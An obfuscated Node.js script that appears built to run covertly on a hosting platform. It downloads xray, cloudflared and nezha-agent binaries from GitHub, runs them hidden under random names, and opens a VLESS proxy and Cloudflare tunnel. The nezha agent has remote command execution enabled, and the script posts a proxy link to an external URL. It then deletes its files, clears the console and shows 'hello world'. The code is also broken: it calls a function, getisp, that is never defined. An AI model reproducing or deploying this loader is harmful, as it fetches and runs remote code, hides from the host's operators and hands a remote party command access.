const _0x178731=_0x57e9;(function(_0x2e985a,_0x3d8407){const _0x3e8923=_0x57e9,_0x467d64=_0x2e985a();while(!![]){try{const _0x399249=parseInt(_0x3e8923(0xd2))/0x1*(-parseInt(_0x3e8923(0xb0))/0x2)+-parseInt(_0x3e8923(0x14a))/0x3*(-parseInt(_0x3e8923(0xe2))/0x4)+parseInt(_0x3e8923(0x163))/0x5*(-parseInt(_0x3e8923(0xff))/0x6)+parseInt(_0x3e8923(0x105))/0x7+-parseInt(_0x3e8923(0x120))/0x8+-parseInt(_0x3e8923(0x118))/0x9+parseInt(_0x3e8923(0xc4))/0xa*(parseInt(_0x3e8923(0xc8))/0xb);if(_0x399249===_0x3d8407)break;else _0x467d64['push'](_0x467d64['shift']());}catch(_0x577286){_0x467d64['push'](_0x467d64['shift']());}}}(_0x122c,0xf2d6f));const FILE_PATH=process[_0x178731(0x128)][_0x178731(0xfb)]||'/tmp',intervalInseconds=process[_0x178731(0x128)][_0x178731(0x160)]||0x64,CFIP=process[_0x178731(0x128)][_0x178731(0x150)]||_0x178731(0x148),CFPORT=process['env'][_0x178731(0xb1)]||_0x178731(0x124),delay=_0x174bb8=>new Promise(_0x337ae5=>setTimeout(_0x337ae5,_0x174bb8)),OPENSERVER=(process[_0x178731(0x128)][_0x178731(0xf5)]||_0x178731(0x164))===_0x178731(0x164),KEEPALIVE=(process['env'][_0x178731(0xf4)]||_0x178731(0xc1))==='true',MY_DOMAIN=process[_0x178731(0x128)][_0x178731(0x12a)]||'',V_DOMAIN=process['env']['V_DOMAIN']||'',V_AUTH=process['env'][_0x178731(0x147)]||'',VLPATH=process['env'][_0x178731(0xe1)]||'',XHPPATH=process[_0x178731(0x128)][_0x178731(0x12d)]||'',PORT=process[_0x178731(0x128)][_0x178731(0xf8)]||process[_0x178731(0x128)]['SERVER_PORT']||0xbb8,V_PORT=process[_0x178731(0x128)]['V_PORT']||0x1f90,UUID=process[_0x178731(0x128)][_0x178731(0xd8)]||'',NVERSION=process[_0x178731(0x128)][_0x178731(0xd6)]||'V0',NSERVER=process['env'][_0x178731(0x115)]||'',NPORT=process[_0x178731(0x128)]['NPORT']||'443',NKEY=process[_0x178731(0x128)][_0x178731(0xd4)]||'',SNAME=process['env']['SNAME']||'',SURL=process[_0x178731(0x128)]['SURL']||'',MYIP_URL=process['env'][_0x178731(0x158)]||'',axios=require('axios'),{pipeline}=require('stream/promises'),os=require('os'),fs=require('fs'),path=require(_0x178731(0x11c)),http=require(_0x178731(0xbd)),https=require(_0x178731(0x10a)),exec=require('child_process')[_0x178731(0x13e)];function createFolder(_0x5742bc){const _0x4c6923=_0x178731;try{fs[_0x4c6923(0x102)](_0x5742bc);}catch(_0x262bf2){if(_0x262bf2['code']==='ENOENT')fs[_0x4c6923(0x137)](_0x5742bc);else{}}}function httpserver(){const _0x53531f=_0x178731,_0x394947=http[_0x53531f(0x16b)]((_0x1e1a33,_0x3af078)=>{const _0x3f08ec=_0x53531f;if(_0x1e1a33[_0x3f08ec(0xcb)]==='/')_0x3af078['writeHead'](0xc8),_0x3af078[_0x3f08ec(0x159)](_0x3f08ec(0x107));else{if(_0x1e1a33[_0x3f08ec(0xcb)]==='/'+UUID){const _0x1f48b1=FILE_PATH+_0x3f08ec(0x161);fs[_0x3f08ec(0xf7)](_0x1f48b1,_0x3f08ec(0xf3),(_0x190b54,_0x10c8c1)=>{const _0x334f21=_0x3f08ec;_0x190b54?(_0x3af078[_0x334f21(0x154)](0x1f4),_0x3af078[_0x334f21(0x159)](_0x334f21(0x112))):(_0x3af078['writeHead'](0xc8,{'Content-Type':'text/plain;\x20charset=utf-8'}),_0x3af078[_0x334f21(0x159)](_0x10c8c1));});}else _0x3af078['writeHead'](0x194),_0x3af078[_0x3f08ec(0x159)](_0x3f08ec(0x130));}});_0x394947[_0x53531f(0x101)](PORT,()=>{console['log']('server\x20is\x20running\x20on\x20port\x20:\x20'+PORT);});}function execPromise(_0x241056,_0x364c2c={}){return new Promise((_0x153dd8,_0x26382b)=>{const _0x5d52ef=exec(_0x241056,_0x364c2c,(_0x40a6ea,_0x360da6,_0xb1beaa)=>{const _0x4e405c=_0x57e9;if(_0x40a6ea){const _0xe25f15=new Error('Command\x20failed:\x20'+_0x40a6ea[_0x4e405c(0xcf)]);_0xe25f15[_0x4e405c(0x123)]=_0x40a6ea[_0x4e405c(0x123)],_0xe25f15[_0x4e405c(0x157)]=_0xb1beaa[_0x4e405c(0x13b)](),_0x26382b(_0xe25f15);}else _0x153dd8(_0x360da6[_0x4e405c(0x13b)]());});});}async function detectProcess(_0x2de3f3){const _0xebc242=_0x178731,_0x347e8e=[{'cmd':_0xebc242(0x108)+_0x2de3f3+'\x22','name':'pidof'},{'cmd':_0xebc242(0x11f)+_0x2de3f3+'\x22','name':_0xebc242(0x14e)},{'cmd':_0xebc242(0xb2)+_0x2de3f3+_0xebc242(0xb5),'name':'ps+awk'}];for(const _0x42a945 of _0x347e8e){try{const _0x129fff=await execPromise(_0x42a945[_0xebc242(0xfe)]);if(_0x129fff)return _0x129fff[_0xebc242(0x11b)](/\n/g,'\x20')[_0xebc242(0x13b)]();}catch(_0x59e18d){_0x59e18d['code']!==0x7f&&_0x59e18d['code']!==0x1&&console[_0xebc242(0x15b)](_0xebc242(0x13d)+_0x42a945['name']+_0xebc242(0x117),_0x59e18d[_0xebc242(0xcf)]);}}return'';}async function killProcess(_0x21781f){const _0x194a36=_0x178731;console[_0x194a36(0x135)]('Attempting\x20to\x20kill\x20process:\x20'+_0x21781f);try{const _0x3418ea=await detectProcess(_0x21781f);if(!_0x3418ea)return console[_0x194a36(0x15d)]('Process\x20\x27'+_0x21781f+_0x194a36(0x119)),{'success':!![],'message':_0x194a36(0xf6)};await execPromise(_0x194a36(0x15e)+_0x3418ea);const _0x4e0724='Killed\x20process\x20(PIDs:\x20'+_0x3418ea+')';return console[_0x194a36(0x135)](_0x4e0724),{'success':!![],'message':_0x4e0724};}catch(_0x5d25d0){const _0x1a69c6='Kill\x20failed:\x20'+_0x5d25d0[_0x194a36(0xcf)];return console[_0x194a36(0x134)](_0x1a69c6),{'success':![],'message':_0x1a69c6};}}function generateRandomString(_0x11879d){const _0x177cbe=_0x178731,_0x15566f=_0x177cbe(0xfc);let _0x50ace4='';for(let _0x342024=0x0;_0x342024<_0x11879d;_0x342024++){_0x50ace4+=_0x15566f[_0x177cbe(0xdd)](Math[_0x177cbe(0x125)](Math['random']()*_0x15566f[_0x177cbe(0xb9)]));}return _0x50ace4;}async function myconfig(){const _0x4c4526=_0x178731,_0x279f09=path[_0x4c4526(0x142)](FILE_PATH,_0x4c4526(0x127)),_0x3fae57='/'+VLPATH,_0xe3acea='/'+XHPPATH;function _0x19260a(){const _0x23ac8f=_0x4c4526,_0x4a7404={'log':{'access':'/dev/null','error':_0x23ac8f(0xef),'loglevel':'none'},'dns':{'servers':[_0x23ac8f(0x111)]}};fs[_0x23ac8f(0x106)](path['join'](_0x279f09,'inbound.json'),JSON['stringify'](_0x4a7404,null,0x2));if(VLPATH&&!XHPPATH){const _0x8252c6={'inbounds':[{'port':V_PORT,'listen':'::','protocol':_0x23ac8f(0x141),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x23ac8f(0xf1)},'streamSettings':{'network':'ws','security':_0x23ac8f(0xf1),'wsSettings':{'path':_0x3fae57}},'sniffing':{'enabled':!![],'destOverride':[_0x23ac8f(0xbd),_0x23ac8f(0xb3),_0x23ac8f(0x16d)],'metadataOnly':![]}}]};fs[_0x23ac8f(0x106)](path[_0x23ac8f(0x142)](_0x279f09,_0x23ac8f(0x13c)),JSON['stringify'](_0x8252c6,null,0x2));}else{if(XHPPATH&&!VLPATH){const _0x282f82={'inbounds':[{'port':V_PORT,'listen':'::','protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x23ac8f(0xf1)},'streamSettings':{'network':_0x23ac8f(0x144),'security':_0x23ac8f(0xf1),'xhttpSettings':{'mode':_0x23ac8f(0xb4),'path':_0xe3acea}},'sniffing':{'enabled':!![],'destOverride':[_0x23ac8f(0xbd),'tls',_0x23ac8f(0x16d)],'metadataOnly':![]}}]};fs[_0x23ac8f(0x106)](path[_0x23ac8f(0x142)](_0x279f09,_0x23ac8f(0x13c)),JSON['stringify'](_0x282f82,null,0x2));}}const _0x2fde3c={'outbounds':[{'tag':'direct','protocol':_0x23ac8f(0xaf)},{'tag':_0x23ac8f(0x133),'protocol':'blackhole'}]};fs[_0x23ac8f(0x106)](path['join'](_0x279f09,_0x23ac8f(0x168)),JSON[_0x23ac8f(0xbb)](_0x2fde3c,null,0x2));}_0x19260a();}function getSystemArchitecture(){const _0x4a1d82=_0x178731,_0x17416b=os[_0x4a1d82(0x16a)]();return _0x17416b===_0x4a1d82(0x10e)||_0x17416b==='arm64'||_0x17416b===_0x4a1d82(0xdc)?_0x4a1d82(0x10e):_0x4a1d82(0xac);}function getFilesForArchitecture(_0x234ac3){const _0x5696e8=_0x178731,_0x5611db={'bot':{'arm':_0x5696e8(0x169),'amd':_0x5696e8(0xd0)},'web':{'arm':_0x5696e8(0x153),'amd':_0x5696e8(0xbc)},'npm':{'V0':{'arm':_0x5696e8(0xbf),'amd':_0x5696e8(0x109)},'V1':{'arm':_0x5696e8(0xda),'amd':_0x5696e8(0x104)}}};let _0x4e4a72=[{'fileName':generateRandomString(0x5),'originalName':_0x5696e8(0xc6),'fileUrl':_0x5611db[_0x5696e8(0xc6)][_0x234ac3]}];if(OPENSERVER){const _0x330229={'fileName':generateRandomString(0x5),'originalName':'bot','fileUrl':_0x5611db[_0x5696e8(0x14c)][_0x234ac3]};_0x4e4a72[_0x5696e8(0x126)](_0x330229);}if(NSERVER&&NPORT&&NKEY&&NVERSION){const _0xb353ad={'fileName':generateRandomString(0x5),'originalName':'npm','fileUrl':_0x5611db['npm'][NVERSION][_0x234ac3]};_0x4e4a72['push'](_0xb353ad);}return _0x4e4a72;}async function download_function(_0x20a26a,_0xae459a,_0x214c5a){const _0x5de0d5=_0x178731,_0x275b36=path[_0x5de0d5(0x142)](FILE_PATH,_0x20a26a);let _0xc9f8c7=![];try{const _0x1faa56=await axios({'method':_0x5de0d5(0x15a),'url':_0x214c5a,'responseType':'stream'});await pipeline(_0x1faa56[_0x5de0d5(0xba)],fs['createWriteStream'](_0x275b36)),_0xc9f8c7=!![];}catch(_0x4d284d){}return{'fileName':_0x20a26a,'originalName':_0xae459a,'filePath':_0x275b36,'success':_0xc9f8c7};}function _0x122c(){const _0xa4d24e=['CFPORT','ps\x20-eo\x20pid,comm\x20|\x20awk\x20-v\x20name=\x22','tls','packet-up','\x22\x20\x27$2\x20==\x20name\x20{print\x20$1}\x27','\x20-c\x20','ENOENT','isp','length','data','stringify','https://github.com/mytcgd/myfiles/releases/download/main/xray','http','2083','https://github.com/kahunama/myfile/releases/download/main/nezha-agent_arm','string','false','originalName','npm\x20file\x20not\x20found,\x20skip\x20running','130KiAzPB','includes','web','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','3842938DgZmft','8443','map','url','App\x20is\x20running','size','?host=','message','https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64',',\x20response:\x20','1QjEfmt','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','NKEY','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','NVERSION','\x20running\x20error:\x20','UUID','Error\x20downloading\x20files:','https://github.com/mytcgd/myfiles/releases/download/main/nezha-agentv1_arm','utf-8','aarch64','charAt','&path=%2F','endsWith','https://api.ip.sb/geoip/','VLPATH','35348dkQlxD','2087','Unknown','\x20run\x20-confdir\x20','request','unlinkSync','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','statusMessage','bot\x20variable\x20is\x20not\x20allowed,\x20skip\x20running','TunnelSecret','/tunnel.yml\x20run','port','fileUrl','/dev/null','\x0a\x20\x20\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20\x20\x20\x20\x20\x20\x20','none','statusCode','utf8','KEEPALIVE','OPENSERVER','Process\x20not\x20found','readFile','PORT','forEach','isDirectory','FILE_PATH','ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789','match','cmd','714HEYWMN','toString','listen','statSync','filePath','https://github.com/mytcgd/myfiles/releases/download/main/nezha-agentv1','3193001QQlLIU','writeFileSync','hello\x20world','pidof\x20\x22','https://github.com/kahunama/myfile/releases/download/main/nezha-agent','https','2053','countryCode','/config.yml','arm','startsWith','\x20--report-delay=4\x20--skip-conn\x20--skip-procs\x20--disable-auto-update\x20>/dev/null\x202>&1\x20&','https+local://8.8.8.8/dns-query','Error\x20reading\x20file','Error\x20in\x20bot\x20process\x20management:','tunnel.json','NSERVER','\x0a\x20\x20\x20\x20\x20\x20\x20\x20credentials-file:\x20','\x20error:','11259081yUONNV','\x27\x20not\x20found','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','replace','path','vless://','readFileSync','pgrep\x20-x\x20\x22','6430808FKYnht','npm','chmodSync','code','443','floor','push','xconf','env','\x0a\x20\x20\x20\x20\x20\x20\x20\x20protocol:\x20http2\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20ingress:\x0a\x20\x20\x20\x20\x20\x20\x20\x20-\x20hostname:\x20','MY_DOMAIN','\x0a\x20\x20\x20\x20\x20\x20\x20\x20tunnel:\x20','country_code','XHPPATH','Error\x20deleting\x20boot.log:\x20','success','Not\x20found','tunnel.yml','\x0a\x20\x20\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','block','error','log','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','mkdirSync','boot.log','substring','\x20-s\x20','trim','inbound_v.json','[detectProcess]\x20','exec','?encryption=none&security=tls&sni=','from','vless','join','/xconf\x20>/dev/null\x202>&1\x20&','xhttp','web\x20file\x20not\x20found,\x20skip\x20running','%3Fed%3D2560&type=ws&encryption=none&security=tls&sni=','V_AUTH','ip.sb','fileName','417OdWzig','rmSync','bot','npm\x20variable\x20is\x20empty,\x20skip\x20running','pgrep','\x20>/dev/null\x202>&1\x20&','CFIP','\x20is\x20running','Error\x20checking\x20boot.log:\x20','https://github.com/mytcgd/myfiles/releases/download/main/xray_arm','writeHead','all','&type=xhttp&host=','stderr','MYIP_URL','end','get','debug','nohup\x20','warn','kill\x20-9\x20','Failed\x20to\x20obtain\x20ArgoDomain\x20even\x20after\x20restarting\x20bot.','TIME','/log.txt','http://ip-api.com/json/','81570dDUpeT','true','\x20-p\x20','write','%3Fed%3D2560&mode=packet-up#','outbound.json','https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64','arch','createServer','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','quic','Error\x20reading\x20boot.log:','amd','Upload\x20failed:','hostname','freedom','2470486xInEqJ'];_0x122c=function(){return _0xa4d24e;};return _0x122c();}let fileMapping={};async function downloadFiles(){const _0x3f14ef=_0x178731;try{const _0x48a289=getSystemArchitecture();if(!_0x48a289)return console[_0x3f14ef(0x135)]('Can\x27t\x20determine\x20system\x20architecture.'),fileMapping;const _0x4e3428=getFilesForArchitecture(_0x48a289);if(_0x4e3428[_0x3f14ef(0xb9)]===0x0)return console[_0x3f14ef(0x135)](_0x3f14ef(0xd3)),fileMapping;const _0x4eaa0f=_0x4e3428[_0x3f14ef(0xca)](_0x15252b=>download_function(_0x15252b['fileName'],_0x15252b[_0x3f14ef(0xc2)],_0x15252b[_0x3f14ef(0xee)])),_0x5a3112=await Promise[_0x3f14ef(0x155)](_0x4eaa0f);return _0x5a3112[_0x3f14ef(0xf9)](_0x3ffdc1=>{const _0x5222d5=_0x3f14ef;if(_0x3ffdc1[_0x5222d5(0x12f)])try{fs[_0x5222d5(0x122)](_0x3ffdc1[_0x5222d5(0x103)],0x1ed),fileMapping[_0x3ffdc1['originalName']]=_0x3ffdc1[_0x5222d5(0x149)];}catch(_0xbfb362){}}),fileMapping;}catch(_0x4f5d8f){return console['error'](_0x3f14ef(0xd9),_0x4f5d8f),fileMapping;}}function argoType(){const _0x50573b=_0x178731;if(!V_AUTH||!V_DOMAIN)return;if(V_AUTH[_0x50573b(0xc5)](_0x50573b(0xeb))){fs['writeFileSync'](path['join'](FILE_PATH,_0x50573b(0x114)),V_AUTH);const _0x1cf7f7=_0x50573b(0x12b)+V_AUTH['split']('\x22')[0xb]+_0x50573b(0x116)+path[_0x50573b(0x142)](FILE_PATH,'tunnel.json')+_0x50573b(0x129)+V_DOMAIN+_0x50573b(0x132)+V_PORT+_0x50573b(0xf0);fs[_0x50573b(0x106)](path[_0x50573b(0x142)](FILE_PATH,_0x50573b(0x131)),_0x1cf7f7);}else{}}function _0x57e9(_0x255825,_0x4d85ad){_0x255825=_0x255825-0xac;const _0x122c7d=_0x122c();let _0x57e965=_0x122c7d[_0x255825];return _0x57e965;}let args;function get_cloud_flare_args(){const _0x3e1965=_0x178731;if(V_AUTH[_0x3e1965(0xfd)](/^[A-Z0-9a-z=]{120,250}$/))args=_0x3e1965(0xc7)+V_AUTH;else V_AUTH[_0x3e1965(0xfd)](/TunnelSecret/)?args=_0x3e1965(0xe8)+FILE_PATH+_0x3e1965(0xec):args=_0x3e1965(0x11a)+FILE_PATH+_0x3e1965(0x16c)+V_PORT;return args;}let NTLS;function nezconfig(){const _0x45af66=_0x178731,_0x2a127c=[_0x45af66(0x124),_0x45af66(0xc9),'2096',_0x45af66(0xe3),_0x45af66(0xbe),_0x45af66(0x10b)];if(NVERSION==='V0')return _0x2a127c[_0x45af66(0xc5)](NPORT)?NTLS='--tls':NTLS='',NTLS;else{if(NVERSION==='V1'){_0x2a127c[_0x45af66(0xc5)](NPORT)?NTLS='true':NTLS=_0x45af66(0xc1);const _0x430791=path['join'](FILE_PATH,_0x45af66(0x10d)),_0x1d3fce='client_secret:\x20'+NKEY+_0x45af66(0xd5)+NSERVER+':'+NPORT+'\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20'+NTLS+_0x45af66(0x136)+UUID;try{fs[_0x45af66(0x106)](_0x430791,_0x1d3fce);}catch(_0x5d082f){}}}}async function runbot(){const _0x551478=_0x178731,_0x4aa288=path[_0x551478(0x142)](FILE_PATH,fileMapping[_0x551478(0x14c)]);try{fs[_0x551478(0x102)](_0x4aa288);try{await execPromise(_0x551478(0x15c)+FILE_PATH+'/'+fileMapping[_0x551478(0x14c)]+'\x20'+args+_0x551478(0x14f));}catch(_0x37a12c){console[_0x551478(0x134)](fileMapping['bot']+_0x551478(0xd7)+_0x37a12c);}}catch(_0x5b8419){if(_0x5b8419[_0x551478(0x123)]===_0x551478(0xb7))console[_0x551478(0x135)]('bot\x20file\x20not\x20found,\x20skip\x20running');else{}}}async function runweb(){const _0x354444=_0x178731,_0x150cc8=path[_0x354444(0x142)](FILE_PATH,fileMapping[_0x354444(0xc6)]);try{fs['statSync'](_0x150cc8);try{await execPromise(_0x354444(0x15c)+FILE_PATH+'/'+fileMapping[_0x354444(0xc6)]+_0x354444(0xe5)+FILE_PATH+_0x354444(0x143));}catch(_0x2d7f77){console['error'](fileMapping[_0x354444(0xc6)]+_0x354444(0xd7)+_0x2d7f77);}}catch(_0x5e2781){if(_0x5e2781[_0x354444(0x123)]===_0x354444(0xb7))console[_0x354444(0x135)](_0x354444(0x145));else{}}}async function runnpm(){const _0x2a532a=_0x178731,_0x42981f=path[_0x2a532a(0x142)](FILE_PATH,fileMapping[_0x2a532a(0x121)]);try{fs[_0x2a532a(0x102)](_0x42981f);try{if(NVERSION==='V0')await execPromise(_0x2a532a(0x15c)+FILE_PATH+'/'+fileMapping['npm']+_0x2a532a(0x13a)+NSERVER+':'+NPORT+_0x2a532a(0x165)+NKEY+'\x20'+NTLS+_0x2a532a(0x110));else NVERSION==='V1'&&await execPromise(_0x2a532a(0x15c)+FILE_PATH+'/'+fileMapping[_0x2a532a(0x121)]+_0x2a532a(0xb6)+FILE_PATH+'/config.yml\x20>/dev/null\x202>&1\x20&');}catch(_0x5d5cae){console['error'](fileMapping[_0x2a532a(0x121)]+_0x2a532a(0xd7)+_0x5d5cae);}}catch(_0x241527){if(_0x241527['code']===_0x2a532a(0xb7))console[_0x2a532a(0x135)](_0x2a532a(0xc3));else{}}}async function runapp(){const _0x2701a7=_0x178731;OPENSERVER?(argoType(),get_cloud_flare_args(),await runbot(),await delay(0x1388)):console[_0x2701a7(0x135)](_0x2701a7(0xea)),await runweb(),await delay(0x3e8),NVERSION&&NSERVER&&NPORT&&NKEY?(nezconfig(),await runnpm(),await delay(0x3e8)):console['log'](_0x2701a7(0x14d));}async function keep_alive(){const _0x5c7ce6=_0x178731,_0x1616e1=await detectProcess(''+fileMapping[_0x5c7ce6(0xc6)]);if(_0x1616e1){}else await runweb();await delay(0x1388);if(OPENSERVER){const _0x1d6d77=await detectProcess(''+fileMapping[_0x5c7ce6(0x14c)]);if(_0x1d6d77){}else await runbot();}await delay(0x1388);if(NVERSION&&NSERVER&&NPORT&&NKEY){const _0x333e0d=await detectProcess(''+fileMapping[_0x5c7ce6(0x121)]);if(_0x333e0d){}else await runnpm();}}function getArgoDomainFromLog(){const _0x3b0780=_0x178731,_0x28fa99=path[_0x3b0780(0x142)](FILE_PATH,_0x3b0780(0x138));try{const _0x43b4b4=fs[_0x3b0780(0x102)](_0x28fa99);if(_0x43b4b4[_0x3b0780(0xcd)]===0x0)return null;const _0x36e595=fs[_0x3b0780(0x11e)](_0x28fa99,_0x3b0780(0xdb)),_0x33a1ee=/info.*https:\/\/(.*trycloudflare\.com)/g;let _0x2f259a,_0x755e14=null;while((_0x2f259a=_0x33a1ee[_0x3b0780(0x13e)](_0x36e595))!==null){_0x755e14=_0x2f259a[0x1];}return _0x755e14;}catch(_0x4d4678){if(_0x4d4678[_0x3b0780(0x123)]===_0x3b0780(0xb7))return null;return console['error'](_0x3b0780(0x16e),_0x4d4678),null;}}function buildurl(_0x296ed5){const _0x38a437=_0x178731;let _0x478d52='';if(VLPATH)_0x478d52='vless://'+UUID+'@'+CFIP+':'+CFPORT+_0x38a437(0xce)+_0x296ed5+_0x38a437(0xde)+VLPATH+_0x38a437(0x146)+_0x296ed5+'#'+ISP+'-'+SNAME;else XHPPATH&&(_0x478d52=_0x38a437(0x11d)+UUID+'@'+CFIP+':'+CFPORT+_0x38a437(0x13f)+_0x296ed5+_0x38a437(0x156)+_0x296ed5+_0x38a437(0xde)+XHPPATH+_0x38a437(0x167)+ISP+'-'+SNAME);return _0x478d52;}let argoDomain,UPLOAD_DATA;async function extractDomains(){const _0x5f5520=_0x178731;let _0x2a12ad='';if(OPENSERVER===!![]){if(V_AUTH&&V_DOMAIN)_0x2a12ad=V_DOMAIN;else{await delay(0xbb8),_0x2a12ad=getArgoDomainFromLog();if(!_0x2a12ad)try{console['log']('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain');const _0xf941cd=path[_0x5f5520(0x142)](FILE_PATH,_0x5f5520(0x138));try{fs['statSync'](_0xf941cd);try{fs[_0x5f5520(0xe7)](_0xf941cd),await delay(0x1f4);}catch(_0x23ea2e){console[_0x5f5520(0x134)](_0x5f5520(0x12e)+_0x23ea2e);}}catch(_0x54a4d9){_0x54a4d9[_0x5f5520(0x123)]!==_0x5f5520(0xb7)&&console[_0x5f5520(0x134)](_0x5f5520(0x152)+_0x54a4d9);}const _0x2871ba=''+fileMapping[_0x5f5520(0x14c)];await killProcess(_0x2871ba),await delay(0x3e8),await runbot(),console[_0x5f5520(0x135)](fileMapping['bot']+_0x5f5520(0x151)),await delay(0x2710),_0x2a12ad=getArgoDomainFromLog(),!_0x2a12ad&&console['error'](_0x5f5520(0x15f));}catch(_0x20f871){console['error'](_0x5f5520(0x113),_0x20f871);return;}else{}}}MY_DOMAIN&&(_0x2a12ad=MY_DOMAIN),argoDomain=_0x2a12ad,UPLOAD_DATA=buildurl(argoDomain);}function cleanString(_0x4c88be){const _0x1bb839=_0x178731;if(typeof _0x4c88be===_0x1bb839(0xc0)){let _0x2ee83f=_0x4c88be;return _0x2ee83f=_0x2ee83f['replace'](/[\s,.]/g,'_'),_0x2ee83f=_0x2ee83f[_0x1bb839(0x11b)](/_+/g,'_'),_0x2ee83f[_0x1bb839(0x10f)]('_')&&(_0x2ee83f=_0x2ee83f[_0x1bb839(0x139)](0x1)),_0x2ee83f[_0x1bb839(0xdf)]('_')&&(_0x2ee83f=_0x2ee83f['slice'](0x0,-0x1)),_0x2ee83f;}return _0x4c88be;}let ISP='UN';async function getipandisp(){const _0x4f0600=_0x178731,_0x14d0bb=[_0x4f0600(0xe0),_0x4f0600(0x162),...MYIP_URL[_0x4f0600(0x13b)]()!==''?[MYIP_URL]:[]];for(const _0x2abccd of _0x14d0bb){try{const _0xcc4b5=await axios[_0x4f0600(0x15a)](_0x2abccd,{'timeout':0xbb8}),_0x4051eb=_0xcc4b5[_0x4f0600(0xba)];if(_0x4051eb['ip']||_0x4051eb['query']){const _0x434a13=_0x4051eb[_0x4f0600(0x12c)]||_0x4051eb[_0x4f0600(0x10c)]||'UN',_0x1e8285=cleanString(_0x4051eb[_0x4f0600(0xb8)])||_0x4f0600(0xe4);ISP=_0x434a13+'_'+_0x1e8285['replace'](/ /g,'_');return;}}catch(_0x326961){}}}function generateLinks(){const _0x477de9=_0x178731;if(UPLOAD_DATA){const _0x5040fc=path['join'](FILE_PATH,'log.txt');fs[_0x477de9(0x106)](_0x5040fc,Buffer[_0x477de9(0x140)](UPLOAD_DATA)[_0x477de9(0x100)]('base64'));}}async function uploadSubscription(_0x99bbb8,_0x5ee50e,_0x37e3b0){const _0x44740b=_0x178731,_0x568d94=JSON[_0x44740b(0xbb)]({'URL_NAME':_0x99bbb8,'URL':_0x5ee50e}),_0x26fb98=Buffer[_0x44740b(0x140)](_0x568d94,_0x44740b(0xf3)),_0x2b7c4a=_0x26fb98['length'],_0x2e3163=new URL(_0x37e3b0),_0x2de566={'hostname':_0x2e3163[_0x44740b(0xae)],'port':_0x2e3163[_0x44740b(0xed)]||0x1bb,'path':_0x2e3163['pathname'],'method':'POST','headers':{'Content-Type':'application/json;\x20charset=utf-8','Content-Length':_0x2b7c4a}};try{const _0x251147=await new Promise((_0x2d034b,_0x55bad4)=>{const _0xaa2b76=_0x44740b,_0x3c883d=https[_0xaa2b76(0xe6)](_0x2de566,_0x4f6254=>{const _0x2b8157=_0xaa2b76;if(_0x4f6254[_0x2b8157(0xf2)]<0xc8||_0x4f6254[_0x2b8157(0xf2)]>=0x12c)return _0x55bad4(new Error('HTTP\x20error!\x20status:\x20'+_0x4f6254[_0x2b8157(0xf2)]+_0x2b8157(0xd1)+_0x4f6254[_0x2b8157(0xe9)]));let _0x55ad1e='';_0x4f6254['on'](_0x2b8157(0xba),_0x12ec03=>_0x55ad1e+=_0x12ec03),_0x4f6254['on']('end',()=>_0x2d034b(_0x55ad1e));});_0x3c883d['on'](_0xaa2b76(0x134),_0xe7a112=>_0x55bad4(_0xe7a112)),_0x3c883d[_0xaa2b76(0x166)](_0x26fb98),_0x3c883d['end']();});return _0x251147;}catch(_0x350267){console[_0x44740b(0x134)](_0x44740b(0xad),_0x350267[_0x44740b(0xcf)]);}}function cleanfiles(){setTimeout(()=>{const _0x41d89a=_0x57e9;let _0x4b195d;KEEPALIVE?_0x4b195d=[]:_0x4b195d=[FILE_PATH+'/'+fileMapping[_0x41d89a(0x14c)],FILE_PATH+'/'+fileMapping[_0x41d89a(0xc6)],FILE_PATH+'/'+fileMapping[_0x41d89a(0x121)],FILE_PATH+'/xconf',FILE_PATH+_0x41d89a(0x10d)],_0x4b195d['forEach'](_0x265354=>{const _0x545d20=_0x41d89a;try{const _0x26b1dc=fs[_0x545d20(0x102)](_0x265354);_0x26b1dc[_0x545d20(0xfa)]()?fs[_0x545d20(0x14b)](_0x265354,{'recursive':!![]}):fs['unlinkSync'](_0x265354);}catch(_0x484bd3){if(_0x484bd3[_0x545d20(0x123)]!==_0x545d20(0xb7)){}}}),console['clear'](),console[_0x41d89a(0x135)](_0x41d89a(0xcc));},0xea60);}let previousargoDomain='';async function subupload(){if(previousargoDomain&&argoDomain===previousargoDomain){}else{const _0x14e008=await uploadSubscription(SNAME,UPLOAD_DATA,SURL);generateLinks(),previousargoDomain=argoDomain;}await delay(0xc350),await extractDomains();}async function main(){createFolder(FILE_PATH),createFolder(path['join'](FILE_PATH,'xconf')),await downloadFiles(),await delay(0x1388),await getisp(),await myconfig(),await runapp(),await extractDomains(),generateLinks(),httpserver(),cleanfiles();if(SURL){const _0x4d867b=await uploadSubscription(SNAME,UPLOAD_DATA,SURL);KEEPALIVE&&OPENSERVER&&!V_AUTH&&!V_DOMAIN&&(previousargoDomain=argoDomain,setInterval(subupload,intervalInseconds*0x3e8));}KEEPALIVE&&(await keep_alive(),setInterval(keep_alive,intervalInseconds*0x3e8));}main();